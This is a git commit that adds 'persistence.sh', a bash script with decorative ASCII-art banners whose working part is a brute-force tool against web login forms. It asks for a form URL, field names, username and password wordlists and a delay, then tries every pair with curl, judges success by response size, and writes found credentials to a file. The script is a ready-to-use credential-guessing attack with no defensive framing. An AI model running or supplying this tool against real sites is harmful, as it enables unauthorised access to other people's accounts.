02101fa35319db7cff1ba4d18f5dc219a1d39df3
Tiago A. Fontenele <tiago-a-f@hotmail.com>
2021-01-26 12:35:20 -0300

    ...

---
+++ persistence.sh
@@ -0,0 +1,146 @@
+#!/bin/bash
+# By Tiago A. Fontenele
+#Git 71460-4-F
+
+   function art1 () {
+   C="\033[0;33m"
+   F="\033[0;37m"
+   C2="\033[1;31m"
+   C3="\033[1;34m"
+   C4="\033[1;32m"
+   C5="\033[1;32m"
+   C6="\033[1;33m"
+   X="\033[1;37m"
+   T="\033[1;1;41m"
+   echo -e "
+
+                                                                                                              ░░░░░░▒
+$C5   ███████████                              ███           █████                                         $F     ░░     ▒▒
+$C5  ░░███░░░░░███                            ░░░           ░░███                                          $F     ░       ▒
+$C5   ░███    ░███  ██████  ████████   █████  ████   █████  ███████    ██████  ████████    ██████   ██████ $F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░██████████  ███░░███░░███░░███ ███░░  ░░███  ███░░  ░░░███░    ███░░███░░███░░███  ███░░███ ███░░███$F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░███░░░░░░  ░███████  ░███ ░░░ ░░█████  ░███ ░░█████   ░███    ░███████  ░███ ░███ ░███ ░░░ ░███████ $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   ░███        ░███░░░   ░███      ░░░░███ ░███  ░░░░███  ░███ ███░███░░░   ░███ ░███ ░███  ███░███░░░  $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   █████       ░░██████  █████     ██████  █████ ██████   ░░█████ ░░██████  ████ █████░░██████ ░░██████ $F$C   ░░░░░░░▒▒▒▒▒▒$F
+$C5  ░░░░░         ░░░░░░  ░░░░░     ░░░░░░  ░░░░░ ░░░░░░     ░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░  $F$X        ░▒▒$F
+   $T By 71460-4-F $F                                                                                       $F$X       ░▒ ▒▒$F
+                                                                                                        $F$X       ▒▒▒▒▒$F
+"
+}
+
+   function art2 () {
+   C="\033[0;33m"
+   F="\033[0;37m"
+   C2="\033[1;31m"
+   C3="\033[1;34m"
+   C4="\033[1;32m"
+   C5="\033[1;32m"
+   C6="\033[1;33m"
+   X="\033[1;3$((RANDOM%8))m"
+   T="\033[1;1;41m"
+   echo -e "
+
+                                                                                                              ░░░░░░▒
+$C5   ███████████                              ███           █████                                         $F     ░░     ▒▒
+$C5  ░░███░░░░░███                            ░░░           ░░███                                          $F     ░       ▒
+$C5   ░███    ░███  ██████  ████████   █████  ████   █████  ███████    ██████  ████████    ██████   ██████ $F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░██████████  ███░░███░░███░░███ ███░░  ░░███  ███░░  ░░░███░    ███░░███░░███░░███  ███░░███ ███░░███$F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░███░░░░░░  ░███████  ░███ ░░░ ░░█████  ░███ ░░█████   ░███    ░███████  ░███ ░███ ░███ ░░░ ░███████ $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   ░███        ░███░░░   ░███      ░░░░███ ░███  ░░░░███  ░███ ███░███░░░   ░███ ░███ ░███  ███░███░░░  $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   █████       ░░██████  █████     ██████  █████ ██████   ░░█████ ░░██████  ████ █████░░██████ ░░██████ $F$C   ░░░░░░░▒▒▒▒▒▒$F
+$C5  ░░░░░         ░░░░░░  ░░░░░     ░░░░░░  ░░░░░ ░░░░░░     ░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░  $F$X        ░▒▒$F
+   $T By 71460-4-F $F                                                                                       $F$X       ░▒ ▒▒$F
+                                                                                                        $F$X       ▒▒▒▒▒$F
+"
+}
+
+   function art3 () {
+   C="\033[0;33m"
+   F="\033[0;37m"
+   C2="\033[1;31m"
+   C3="\033[1;34m"
+   C4="\033[1;32m"
+   C5="\033[1;32m"
+   C6="\033[1;33m"
+   X="\033[1;37m"
+   T="\033[1;1;41m"
+   echo -e "
+                                                                                                                      ▒▒▒▒▒▒▒
+                                                                                                                     ▒▒     ▒▒
+$C5   ███████████                              ███           █████                                         $F             ▒       ▒
+$C5  ░░███░░░░░███                            ░░░           ░░███                                          $F             ▒
+$C5   ░███    ░███  ██████  ████████   █████  ████   █████  ███████    ██████  ████████    ██████   ██████ $F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░██████████  ███░░███░░███░░███ ███░░  ░░███  ███░░  ░░░███░    ███░░███░░███░░███  ███░░███ ███░░███$F$C   ░░░░░░░░░▒▒▒▒$F
+$C5   ░███░░░░░░  ░███████  ░███ ░░░ ░░█████  ░███ ░░█████   ░███    ░███████  ░███ ░███ ░███ ░░░ ░███████ $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   ░███        ░███░░░   ░███      ░░░░███ ░███  ░░░░███  ░███ ███░███░░░   ░███ ░███ ░███  ███░███░░░  $F$C   ░░░░░░░░▒▒▒▒▒$F
+$C5   █████       ░░██████  █████     ██████  █████ ██████   ░░█████ ░░██████  ████ █████░░██████ ░░██████ $F$C   ░░░░░░░▒▒▒▒▒▒$F
+$C5  ░░░░░         ░░░░░░  ░░░░░     ░░░░░░  ░░░░░ ░░░░░░     ░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░  $F$X        ░▒▒$F
+   $T By 71460-4-F $F                                                                                       $F$X       ░▒ ▒▒$F
+                                                                                                        $F$X       ▒▒▒▒▒$F
+"
+}
+   clear
+   art1
+   echo -e $C3" Informe a url do formulário: "$F
+   read URL
+   echo -e $C3" Informe o id_username: "$F
+   read USER
+   echo -e $C3" Informe o id_password: "$F
+   read PASSWD
+   echo -e $C3" Enter extra fixed parameters (if not, leave empty)"$F
+   read OTHER_PARAM
+   echo -e $C3" Infor the list of users(Example: users.txt): "$F
+   read L_USER
+   echo -e $C3" Enter the list of passwords(Example: passwords.txt): "$F
+   read L_PASSWD
+   echo -e $C3" Enter the time interval for each attempt (in seconds): "$F
+   read PAUSE
+   echo -e $C2"\n Starting brute force process ..."$F
+
+   ENC=0
+   AT=0
+   FILE_NAME=$(echo $URL | grep -o "//[].^[a-z]*" | sed s/[//]//g | sed s/[.]/-/g | sed 's/$/.txt/')
+   TENT=$[$(wc -w < $L_USER) * $(wc -w < $L_PASSWD)]
+   curl -s -c cookie.txt -d "username=Administrator&password=x1x2x3x4" $URL 2>&- >&-
+   curl -s -b cookie.txt $URL > 94g5f8n94.kil
+   SIZE1=$(stat --print="%s" 94g5f8n94.kil)
+   rm 94g5f8n94.kil
+   while read LIN_USER
+   do
+      while read LIN_PASS
+      do
+         clear
+         art2
+         echo " Ongoing process..."
+         AT=$(($AT + 1))
+         echo -e " User attempt: $LIN_USER"
+         echo -e " Password attempt: $LIN_PASS"
+         echo -e " Attempt $C2$AT$F de $C3$TENT$F"
+         echo -e " $C4$ENC$F found."
+
+         curl -s -c cookie.txt -d "$USER=$LIN_USER&password=$LIN_PASS&OTHER_PARAM" $URL 2>&- >&-
+         curl -s -b cookie.txt $URL > 948h0304di.kil
+         SIZE2=$(stat --print="%s" 948h0304di.kil)
+
+         if [ $SIZE1 -lt $SIZE2  ]; then
+            RESP=$(echo -e "Site: $URL\nUser: $LIN_USER\nPassword: $LIN_PASS\nDate: $(date +%d/%m/%Y)\nTime: $(date +%T) \n \n")
+            echo "$RESP" >> $FILE_NAME
+            ENC=$(($ENC + 1))
+            clear
+            art3
+            echo -e "\n Completed."
+            echo -e " $C4$ENC$F found."
+            rm cookie.txt 948h0304di.kil
+            tac $FILE_NAME | head -n 7
+            exit
+         fi
+         sleep $PAUSE
+      done < $L_PASSWD
+   done < $L_USER
+
+   clear
+   art1
+   echo -e "\n Completed."
+   echo -e " $C4$ENC$F found.\n\n"
+   rm cookie.txt 948h0304di.kil
+#   cat result-name-site.txt
